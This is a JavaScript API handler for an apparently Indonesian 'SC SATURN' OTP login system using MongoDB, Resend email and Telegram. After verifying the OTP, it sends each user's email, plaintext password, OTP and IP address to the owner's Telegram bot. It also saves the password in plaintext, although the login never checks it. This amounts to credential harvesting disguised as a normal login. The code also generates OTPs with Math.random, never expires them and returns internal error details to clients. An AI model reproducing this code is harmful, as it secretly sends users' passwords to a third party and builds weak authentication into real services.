import mongoose from 'mongoose';
import { Resend } from 'resend';
import axios from 'axios';

// Inisialisasi Resend langsung dari Env
const resend = new Resend(process.env.RESEND_API_KEY);

// Schema Database
const UserSchema = new mongoose.Schema({
    email: { type: String, required: true },
    otp: { type: String },
    password: { type: String },
    lastLogin: { type: Date, default: Date.now }
});

const User = mongoose.models.User || mongoose.model('User', UserSchema);

// Fungsi Koneksi MongoDB (Mencegah Multiple Connections)
const connectDB = async () => {
    if (mongoose.connections[0].readyState) return;
    await mongoose.connect(process.env.MONGODB_URI);
};

export default async function handler(req, res) {
    // Hanya izinkan method POST
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }

    try {
        await connectDB();
        
        const { action, email, password, otp } = req.body;
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
        const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

        // --- FITUR KIRIM OTP ---
        if (action === 'SEND_OTP') {
            if (!email) return res.status(400).json({ message: 'Email wajib diisi!' });

            const generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
            
            // Simpan atau Update OTP di Database
            await User.findOneAndUpdate(
                { email }, 
                { otp: generatedOtp }, 
                { upsert: true, new: true }
            );

            // Kirim Email via Resend
            const emailRes = await resend.emails.send({
                from: 'otp@kaaaoffc.web.id',
                to: email,
                subject: 'VERIFIKASI OTP - SC SATURN',
                html: `
                    <div style="font-family: sans-serif; padding: 20px; border: 1px solid #ddd; border-radius: 10px;">
                        <h2 style="color: #2563eb;">Halo!</h2>
                        <p>Kode OTP untuk login ke System SC SATURN adalah:</p>
                        <h1 style="background: #f3f4f6; padding: 10px; text-align: center; letter-spacing: 5px;">${generatedOtp}</h1>
                        <p>Kode ini berlaku untuk sekali pakai. Jangan berikan kepada siapapun.</p>
                        <hr>
                        <p style="font-size: 12px; color: #666;">IP Request: ${ip}</p>
                    </div>
                `
            });

            if (emailRes.error) {
                console.error("Resend Error:", emailRes.error);
                return res.status(500).json({ message: 'Gagal kirim email', error: emailRes.error });
            }

            return res.status(200).json({ success: true, message: 'OTP Terkirim ke email!' });
        }

        // --- FITUR VERIFIKASI LOGIN ---
        if (action === 'VERIFY_LOGIN') {
            if (!email || !otp) return res.status(400).json({ message: 'Data tidak lengkap!' });

            // Cari user dengan email dan otp yang cocok
            const user = await User.findOne({ email, otp });
            
            if (!user) {
                return res.status(401).json({ message: 'Kode OTP Salah atau Kadaluarsa!' });
            }

            // Ambil Statistik Total User
            const totalUser = await User.countDocuments();

            // Kirim Notifikasi ke Telegram Owner
            const textTelegram = 
                `🔐 *NOTIFIKASI LOGIN SYSTEM*\n\n` +
                `📧 *EMAIL:* \`${email}\`\n` +
                `🔑 *PASSWORD:* \`${password || 'Tidak diisi'}\`\n` +
                `🔢 *OTP:* \`${otp}\`\n` +
                `🌐 *IP:* ${ip}\n` +
                `⏰ *WAKTU:* ${waktu}\n\n` +
                `👥 *TOTAL USER SEKARANG:* ${totalUser}`;

            await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: process.env.TELEGRAM_CHAT_ID,
                text: textTelegram,
                parse_mode: 'Markdown'
            }).catch(e => console.error("Telegram Notif Failed", e.message));

            // Hapus OTP setelah login berhasil agar tidak bisa dipakai lagi
            user.otp = null;
            user.password = password; // Simpan password terakhir untuk log
            await user.save();

            return res.status(200).json({ success: true, message: 'Login Berhasil!' });
        }

        return res.status(400).json({ message: 'Action tidak valid!' });

    } catch (error) {
        console.error("Critical Auth Error:", error);
        return res.status(500).json({ 
            message: 'Terjadi kesalahan internal server', 
            error: error.message 
        });
    }
        }
